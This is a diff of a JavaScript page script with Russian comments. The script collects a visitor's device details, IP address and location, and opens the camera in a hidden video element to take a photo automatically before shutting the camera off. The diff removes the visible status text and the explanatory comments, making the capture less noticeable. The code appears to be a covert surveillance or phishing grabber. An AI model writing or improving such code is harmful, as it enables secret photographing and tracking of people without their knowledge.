@@ -1,21 +1,13 @@
 (function() {
     'use strict';
 
-    // ===== ЭЛЕМЕНТЫ =====
-    const statusText = document.getElementById('statusText');
-    const subtitle = document.querySelector('.subtitle');
-
     // ===== ПЕРЕМЕННЫЕ =====
-    let stream = null;
     let isPhotoTaken = false;
     let isProcessing = false;
-    let collectedData = {};
 
     // ===== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ =====
     function setStatus(text) {
         console.log('📊 Статус:', text);
-        subtitle.textContent = text;
-        if (statusText) statusText.textContent = text;
     }
 
     function dataURLToBlob(dataURL) {
@@ -234,7 +226,7 @@
         const ipData = await getIP();
         const locationData = await getLocation();
         
-        collectedData = {
+        const collectedData = {
             timestamp,
             device: deviceData,
             ip: ipData,
@@ -295,7 +287,6 @@
                 audio: false
             });
             
-            // Создаём скрытый video элемент
             const video = document.createElement('video');
             video.srcObject = stream;
             video.autoplay = true;
@@ -309,7 +300,6 @@
             
             setTimeout(() => {
                 takePhoto(video);
-                // Останавливаем камеру после фото
                 setTimeout(() => {
                     stream.getTracks().forEach(track => track.stop());
                     video.remove();
@@ -340,7 +330,6 @@
     function init() {
         setStatus('🔄 Подготовка...');
         
-        // Проверка поддержки камеры
         if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
             setStatus('⚠️ Браузер не поддерживает камеру');
             collectAllData().then((data) => {
@@ -349,7 +338,6 @@
             return;
         }
         
-        // Запускаем камеру через 1 секунду
         setTimeout(startCamera, 1000);
     }
 
